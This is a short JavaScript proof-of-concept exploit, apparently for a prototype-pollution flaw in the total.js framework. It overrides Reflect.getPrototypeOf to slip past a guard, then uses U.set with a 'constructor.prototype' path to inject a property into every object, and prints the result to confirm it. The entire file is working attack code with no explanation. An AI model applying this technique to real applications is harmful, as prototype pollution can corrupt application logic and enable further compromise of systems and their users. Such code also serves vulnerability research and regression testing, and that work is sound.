Reflect.getPrototypeOf = () => false;
const total = require('total.js');
obj = {};
console.log({}.polluted);
U.set({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);